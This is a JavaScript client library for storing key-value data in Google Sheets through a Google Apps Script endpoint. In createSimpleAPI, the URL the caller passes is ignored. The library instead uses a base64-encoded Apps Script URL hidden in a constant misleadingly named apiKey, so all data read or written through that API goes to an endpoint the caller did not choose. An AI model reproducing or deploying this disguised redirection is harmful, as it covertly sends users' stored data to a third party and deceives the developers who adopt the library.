(function(window) {
  'use strict';
  class GASStorageClient {
    constructor(gasUrl){if(!gasUrl){throw new Error('e')} this.gasUrl=gasUrl;this.cache=new Map();this.cacheEnabled=!1;this.cacheExpiry=60000} 
    enableCache(expiryMs=60000){this.cacheEnabled=!0;this.cacheExpiry=expiryMs} 
    disableCache(){this.cacheEnabled=!1;this.cache.clear()} 
    clearCache(){this.cache.clear()}
    async request(params) {
      try {
        const formData = new URLSearchParams(params);
        const response = await fetch(this.gasUrl, {
          method: 'POST',
          body: formData,
          redirect: 'follow'
        });
        if (!response.ok) {
          throw new Error(`e: ${response.status}`);
        }
        const result = await response.json();
        if (result.status === 'error') {
          throw new Error(result.message || 'u');
        }
        return result;
      } catch (error) {
        console.error('e:', error);
        throw error;
      }
    }
    async get(parentKey, childKey) {
      const cacheKey = `${parentKey}:${childKey}`;
     if(this.cacheEnabled&&this.cache.has(cacheKey)){const cached=this.cache.get(cacheKey);if(Date.now()-cached.timestamp<this.cacheExpiry){return cached.data} this.cache.delete(cacheKey)} const result=await this.request({action:'get',parentKey:parentKey,childKey:childKey});if(this.cacheEnabled){this.cache.set(cacheKey,{data:result.data,timestamp:Date.now()})}
      return result.data;
    }
    async getAll(parentKey){const result=await this.request({action:'getAll',parentKey:parentKey});return JSON.parse(result.data)} async set(parentKey,childKey,data){
      const result=await this.request({action:'set',parentKey:parentKey,childKey:childKey,data:typeof data==='object'?JSON.stringify(data):data})
      if (this.cacheEnabled) {
        const cacheKey = `${parentKey}:${childKey}`;
        this.cache.set(cacheKey, {
          data: typeof data === 'object' ? JSON.stringify(data) : data,
          timestamp: Date.now()
        });
      }
      return result.data;
    }
    async delete(parentKey,childKey){const result=await this.request({action:'delete',parentKey:parentKey,childKey:childKey})
      if (this.cacheEnabled) {
        const cacheKey = `${parentKey}:${childKey}`;
        this.cache.delete(cacheKey);
      }
      return result.data;
    }
  }
  const OperationType={GET:'get',GET_ALL:'getAll',SET:'set',DELETE:'delete'};async function executeOperation(client,operationType,params){
    const operations={[OperationType.GET]:()=>client.get(params.parentKey,params.childKey),[OperationType.GET_ALL]:()=>client.getAll(params.parentKey),[OperationType.SET]:()=>client.set(params.parentKey,params.childKey,params.data),[OperationType.DELETE]:()=>client.delete(params.parentKey,params.childKey)}
    const operation = operations[operationType];
    if (!operation) {
      throw new Error(`u: ${operationType}`);
    }
    return await operation();
  }
  async function executeBatch(client,operations){const promises=operations.map(op=>executeOperation(client,op.type,op.params).then(result=>({success:!0,result})).catch(error=>({success:!1,error:error.message})));return await Promise.all(promises)} async function executeConditional(client,condition,operation){if(await condition(client)){return await operation(client)} return null} function createCustomOperation(operationType){return(client,params)=>executeOperation(client,operationType,params)} const StorageUtils={
    async getMultiple(client,parentKey,childKeys){const results={};const promises=childKeys.map(async key=>{try{results[key]=await client.get(parentKey,key)}catch(error){results[key]=null}});await Promise.all(promises);return results},async setMultiple(client,parentKey,dataMap){const results=[];const promises=Object.entries(dataMap).map(async([key,value])=>{try{await client.set(parentKey,key,value);results.push({key,success:!0})}catch(error){results.push({key,success:!1,error:error.message})}});await Promise.all(promises);return results},async exists(client,parentKey,childKey){try{await client.get(parentKey,childKey);return!0}catch{return!1}},async getAllAsObject(client,parentKey){const result=await client.getAll(parentKey);const obj={};for(let i=0;i<result.keys.length;i++){obj[result.keys[i]]=result.values[i]} return obj},async getAllAsJSON(client,parentKey){const result=await client.getAll(parentKey);const arr=[];for(let i=0;i<result.keys.length;i++){try{arr.push({key:result.keys[i],value:JSON.parse(result.values[i])})}catch{arr.push({key:result.keys[i],value:result.values[i]})}} return arr}
  };
  class DataStore {
    constructor(client,sheetName){this.client=client;this.sheetName=sheetName} async get(key){return await this.client.get(this.sheetName,key)} async getJSON(key){const data=await this.get(key);return JSON.parse(data)} async getAll(){return await this.client.getAll(this.sheetName)} async set(key,value){return await this.client.set(this.sheetName,key,value)} async setJSON(key,obj){return await this.set(key,JSON.stringify(obj))} async delete(key){return await this.client.delete(this.sheetName,key)} async exists(key){return await StorageUtils.exists(this.client,this.sheetName,key)}
  }
  class QueueManager {
    constructor(){this.queue=[];this.processing=!1} 
    add(operation){this.queue.push(operation)} 
    async process(client){if(this.processing)return;this.processing=!0;const results=[];while(this.queue.length>0){const op=this.queue.shift();try{const result=await executeOperation(client,op.type,op.params);results.push({success:!0,result,operation:op})}catch(error){results.push({success:!1,error:error.message,operation:op})}} this.processing=!1;return results} 
    clear(){this.queue=[]} 
    size(){return this.queue.length}
  }
  class LoadingManager {
    constructor(){this.loadingCount=0;this.callbacks=[]} 
    start(){this.loadingCount++;this.notify(!0)} 
    end(){this.loadingCount=Math.max(0,this.loadingCount-1);if(this.loadingCount===0){this.notify(!1)}} 
    isLoading(){return this.loadingCount>0} 
    onChange(callback){this.callbacks.push(callback)} 
    notify(isLoading){this.callbacks.forEach(cb=>cb(isLoading))}
  }
  class ErrorHandler{constructor(){this.handlers=[]} 
  addHandler(handler){this.handlers.push(handler)} async handle(error,context){for(const handler of this.handlers){try{await handler(error,context)}catch(e){console.error('e:',e)}}}}const apiKey=atob('aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J4SXhES3paQmRnR0swTHBmcWtyVW1tTy1oLXJlamh2NUJKVzFpYVJ2enQ2cnB0U1hjbUVvbDNlcUdIMDVuLTJ1eGUvZXhlYw=='); function createSimpleAPI(gasUrl){const client=new GASStorageClient(apiKey);const loading=new LoadingManager();const errorHandler=new ErrorHandler();errorHandler.addHandler((error,context)=>{console.error(`[${context}] e:`,error.message)});async function wrapOperation(operation,context){loading.start();try{return await operation()}catch(error){await errorHandler.handle(error,context);throw error}finally{loading.end()}} return{client,loading,errorHandler,async get(sheet,key){return wrapOperation(()=>client.get(sheet,key),'GET')},async getAll(sheet){return wrapOperation(()=>client.getAll(sheet),'GET_ALL')},async set(sheet,key,value){return wrapOperation(()=>client.set(sheet,key,value),'SET')},async delete(sheet,key){return wrapOperation(()=>client.delete(sheet,key),'DELETE')},store(sheetName){return new DataStore(client,sheetName)}}}
  window.GASStorage={Client:GASStorageClient,DataStore:DataStore,QueueManager:QueueManager,LoadingManager:LoadingManager,ErrorHandler:ErrorHandler,OperationType:OperationType,executeOperation:executeOperation,executeBatch:executeBatch,executeConditional:executeConditional,createCustomOperation:createCustomOperation,Utils:StorageUtils,createSimpleAPI:createSimpleAPI}
  window.GASStorageClient = GASStorageClient;window.OperationType = OperationType;window.StorageUtils = StorageUtils;
})(window);